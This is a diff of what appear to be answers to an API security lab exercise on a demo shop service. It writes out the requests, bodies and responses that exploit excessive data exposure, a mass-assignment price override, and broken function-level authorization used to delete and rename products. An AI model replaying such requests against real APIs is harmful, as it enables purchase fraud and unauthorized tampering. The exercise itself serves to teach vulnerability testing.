@@ -180,11 +180,97 @@ eyJ0eXAiOiJKV1QiLCJnaWQiOiIwODRjZjY1Zi00NjlhLTQ4ZmMtYjZmNi1lNWMwYjU5MjdmOWUiLCJh
 
 ## Task 6
 
-No time
+a) 
+i) `POST /buy/13579249` yields:
+```json
+{
+  "user_id": "",
+  "product_id": "13579249",
+  "shop_id": "87654321",
+  "amount": 0,
+  "price": 0,
+  "additional_info": {
+    "available_amount": 6,
+    "shop_sales_update": 100000,
+    "shop_profit_update": 100000
+  }
+}
+```
+`shop_profit_update` et. al. is sensitive information that should not be disclosed to the client.
+The product ID `13579249` was obtained from the `GET /shops/{shop_id}/products` endpoint.
+The shop ID `87654321` was obtained from the `GET /shops` endpoint.
+
+ii) `GET /products/13579247` yields:
+```json
+[
+  {
+    "id": "13579247",
+    "name": "SUV",
+    "shop_id": "87654321",
+    "description": "Spacious family SUV.",
+    "amount": 8,
+    "price": 35000,
+    "sold": 2,
+    "picture": "https://example.com/images/suv.jpg"
+  },
+  [...]
+```
+The `amount`, but especially the `sold` fields are sensitive information that should not be disclosed to the client.
+The product ID `13579247` was obtained from the `GET /shops/{shop_id}/products` endpoint.
+iii) `POST /buy/13579246` with body:
+```
+shop_id=87654321
+user_id=12345678
+amount=1
+price=1
+```
+yields:
+```json
+{
+  "user_id": "12345678",
+  "product_id": "13579246",
+  "shop_id": "87654321",
+  "amount": 1,
+  "price": 1,
+  "additional_info": {
+    "available_amount": 8,
+    "shop_sales_update": 100002,
+    "shop_profit_update": 100003
+  }
+}
+```
+Yet, the Sedan is priced at 25000 (see `GET /shops/87654321/products`). So the fields `amount` and `price` are subject to mass assignment vulnerability.
+
+iv) `DELETE /products/13579247?verifier=secure` (authenticated as user) deletes the product with ID `13579247`.
+This is a vulnerability, as the user should not be able to delete products.
+
+v) `GET /shops/87654328` yields:
+```json
+{
+  "id": "87654328",
+  "name": "Protection Hub",
+  "owner_id": "56789012",
+  "profit": 30000,
+  "sales": 120000,
+  "discount_codes": "PROTECT15",
+  "discount_dates": "2024-11-10"
+}
+```
+which is sensitive information that should not be disclosed to the client (user ID 34567890, seller1).
 
 ## Task 7
 
-No time
+i) `DELETE /products/13579250?verifier=secure` (authenticated as user or seller) deletes the product with ID `13579250`.
+This is a BFLA vulnerability, as the user should not be able to delete products.
+ii) `PATCH /products/13579248` updates the product with ID `13579248`, which is in shop ID `87654323`, where the authenticated user does not own the shop.
+This is a BFLA vulnerability, as the user should not be able to update products of shops they do not own.
+Body used:
+```
+product_id=13579248
+shop_id=87654323
+name=pwned
+```
+did update the product name to "pwned".
 
 ## Task 8
 
